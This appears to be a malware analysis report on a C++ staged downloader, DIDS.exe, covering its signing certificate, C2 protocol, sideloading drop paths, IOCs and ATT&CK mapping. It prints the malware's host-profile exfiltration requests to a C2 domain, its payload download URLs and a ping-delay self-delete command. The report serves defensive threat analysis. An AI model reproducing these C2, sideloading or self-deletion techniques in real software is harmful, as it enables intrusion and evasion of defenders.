# DIDS.exe — Malware Analysis Report

**Date:** 2026-03-03
**Analyst:** Claude Code (REMnux)
**Classification:** Operator-Gated Staged Downloader — **HIGH confidence**

---

## Executive Summary

`DIDS.exe` is a lightweight C++ staged downloader that registers victim machines with a C2 server and waits for manual operator approval before delivering a second-stage payload. The approval gate makes it highly resistant to automated sandbox analysis. Victims are profiled for domain membership before registration, suggesting targeted delivery. The sample self-deletes after execution. The 3-day Microsoft Trusted Signing certificate matches a pattern seen in the IoTrust RAT family, suggesting a possible shared actor or shared certificate abuse tradecraft.

---

## Sample Metadata

| Field | Value |
|-------|-------|
| Filename | `DIDS.exe` |
| SHA256 | `24857fe82f454719cd18bcbe19b0cfa5387bee1022008b7f5f3a8be9f05e4d14` |
| SHA1 | `c16099c29ccdb34764e4d15b1dab2d141d159950` |
| MD5 | `439c0a0a46627bd166e08436f383ad56` |
| Size | 307,656 bytes |
| File Type | PE32 console, Intel 386 |
| Compiler | MSVC 2019 (linker 14.29, LTCG/C++) |
| PE Timestamp | 2026-02-14 16:14:39 UTC |
| Subsystem | Windows command line (console) |
| Sections | 5 |
| PDB Path | `C:\Users\Public\ConsoleApplication1\Release\ConsoleApplication1.pdb` |
| Internal Name | `DIDS` |
| Product Name | `DISPLAY drives Handeler` *(typo: "Handeler")* |
| Company Name | `DISPLAY drives` |
| Version | 1.0.0.1 |
| Copyright | Copyright (C) 2026 |
| Code Signing | Microsoft Trusted Signing — **Donald Gay, Clinton, Maryland** |
| Cert Validity | 2026-02-16 → 2026-02-19 (**3-day certificate**, expired) |

---

## Version Metadata and PDB Analysis

The PE version metadata presents a thin cover identity — "DISPLAY drives Handeler" — with a deliberate typo in "Handeler" suggesting hasty or careless construction. The product description has no relation to the binary's actual behaviour.

The PDB path `C:\Users\Public\ConsoleApplication1\Release\ConsoleApplication1.pdb` is a Visual Studio default project name, indicating the developer did not rename the project before building. The `C:\Users\Public\` user directory (rather than a personal user profile) may indicate a shared build machine or deliberate use of a non-attributable path.

---

## Code Signing Note

The sample is signed with a **3-day Microsoft Trusted Signing** certificate issued to **Donald Gay, Clinton, Maryland**. This is the same certificate mechanism observed in the IoTrust RAT family (signed by "Nicholas Hall, Hanover Indiana" with a similarly short 3-day window). Both certificates were issued through Microsoft's Trusted Signing service, which requires only a Microsoft account for enrolment with minimal identity verification. The consistent use of short-lived certs under different personal names suggests either a shared actor rotating identities or a common technique being adopted across independent actors.

---

## Execution Flow

### Stage 1 — Victim Reconnaissance

On launch, the sample collects basic host information using Windows API calls:

- `GetComputerNameA` — machine hostname
- `GetUserNameA` — current username
- `USERDOMAIN` environment variable — domain name

The domain value is compared against `WORKGROUP` to determine whether the victim is on a corporate domain or a standalone machine, likely to allow the operator to prioritise high-value (domain-joined) targets.

---

### Stage 2 — C2 Registration

```
POST http://moonzonet.com/register
User-Agent: StageClient/2.0
Content-Type: application/json

{"client_id":"%s","computer_name":"%s","username":"%s","domain":"%s"}
```

A `client_id` is generated to identify the victim across subsequent requests. The full host profile (hostname, username, domain) is sent to the operator at this point.

---

### Stage 3 — Operator Approval Gate (sandbox-resistant)

```
POST http://moonzonet.com/check
Body: {"client_id":"%s"}
```

The sample polls `/check` and waits for the response to contain:

```json
"approved": true
```

(Both `"approved": true` with and without a space after the colon are handled, suggesting defensive parsing.) Execution halts until the operator manually approves the victim. This gate means the sample produces no malicious network activity in automated sandboxes unless an operator is actively monitoring and responding — a deliberate anti-analysis design.

---

### Stage 4 — Payload Download

Once approved, four files are downloaded and written to disk:

| URL | Drop Path |
|-----|-----------|
| `http://moonzonet.com/download/Game.exe` | `%APPDATA%\GameFiles\Game.exe` (fallback: `C:\Users\Public\Downloads`) |
| `http://moonzonet.com/download/Game.dll` | `%APPDATA%\GameFiles\Game.dll` |
| `http://moonzonet.com/download/Game.config` | `%APPDATA%\GameFiles\Game.config` |
| `http://moonzonet.com/download/Game.exe` (sideload) | `%APPDATA%\GameFiles\WebView2Loader.dll` |

The placement of `WebView2Loader.dll` alongside `Game.exe` is a **DLL sideloading** setup — `Game.exe` is expected to load `WebView2Loader.dll` from its own directory at runtime, allowing the malicious DLL to execute in the context of whatever `Game.exe` impersonates.

Progress is reported back to the C2 at each step:

```
POST http://moonzonet.com/status
Body: {"client_id":"%s","status":"%s","error_code":"%s"}
```

Status values: `downloading` → `running` → `success` (or `EXIT_%lu` / error codes on failure).

A status marker is also written locally to `visualwincomp.txt`.

---

### Stage 5 — Execution and Self-Deletion

`Game.exe` is launched from `%APPDATA%\GameFiles\`. After execution begins, the dropper self-deletes using a ping-delay technique:

```
cmd.exe /c ping 127.0.0.1 -n 6 > nul && del /f /q "<path to DIDS.exe>"
```

The 6-ping loop (~5 seconds) gives the process time to exit before the delete command runs, leaving no dropper on disk. The second-stage payload and the legitimate file it impersonates remain.

---

## C2 Infrastructure

| Endpoint | Method | Purpose |
|----------|--------|---------|
| `http://moonzonet.com/register` | POST | Victim registration; send host profile |
| `http://moonzonet.com/check` | POST | Poll for operator approval gate |
| `http://moonzonet.com/status` | POST | Report download/execution progress |
| `http://moonzonet.com/download/Game.exe` | GET | Fetch second-stage executable |
| `http://moonzonet.com/download/Game.dll` | GET | Fetch second-stage DLL |
| `http://moonzonet.com/download/Game.config` | GET | Fetch second-stage configuration |

**Note:** All C2 communication uses plain **HTTP** (not HTTPS). Traffic is unencrypted and interceptable.

---

## Second-Stage Payload

The second-stage components (`Game.exe`, `Game.dll`, `Game.config`) were not available for analysis at time of writing — the C2 was not responding with an approved status. The `WebView2Loader.dll` sideload and `Game.config` suggest the payload may be a Chromium-based application or a loader that abuses the WebView2 runtime.

---

## IOCs

### Network
```
moonzonet.com
http://moonzonet.com/register
http://moonzonet.com/check
http://moonzonet.com/status
http://moonzonet.com/download/Game.exe
http://moonzonet.com/download/Game.dll
http://moonzonet.com/download/Game.config
User-Agent: StageClient/2.0
```

### File System
```
%APPDATA%\GameFiles\Game.exe
%APPDATA%\GameFiles\Game.dll
%APPDATA%\GameFiles\Game.config
%APPDATA%\GameFiles\WebView2Loader.dll
%APPDATA%\GameFiles\visualwincomp.txt
C:\Users\Public\Downloads\Game.exe   (fallback drop path)
```

### Hashes
```
SHA256: 24857fe82f454719cd18bcbe19b0cfa5387bee1022008b7f5f3a8be9f05e4d14
SHA1:   c16099c29ccdb34764e4d15b1dab2d141d159950
MD5:    439c0a0a46627bd166e08436f383ad56
```

### Strings / Signatures
```
PDB:        C:\Users\Public\ConsoleApplication1\Release\ConsoleApplication1.pdb
User-Agent: StageClient/2.0
Signer:     Donald Gay, Clinton, Maryland (Microsoft Trusted Signing, 3-day)
```

---

## MITRE ATT&CK Mapping

| ID | Technique | Evidence |
|----|-----------|----------|
| T1105 | Ingress Tool Transfer | Downloads Game.exe/dll/config from C2 |
| T1574.002 | Hijack Execution Flow: DLL Side-Loading | Drops WebView2Loader.dll alongside Game.exe |
| T1082 | System Information Discovery | Collects hostname, username, domain |
| T1033 | System Owner/User Discovery | `GetUserNameA`, `USERDOMAIN` |
| T1016 | System Network Configuration Discovery | WORKGROUP check for domain membership |
| T1071.001 | Application Layer Protocol: Web Protocols | HTTP C2 |
| T1070.004 | Indicator Removal: File Deletion | ping-delay self-delete |
| T1036 | Masquerading | "DISPLAY drives Handeler" cover identity; Game.exe naming |
| T1497 | Virtualization/Sandbox Evasion | Operator approval gate blocks automated analysis |
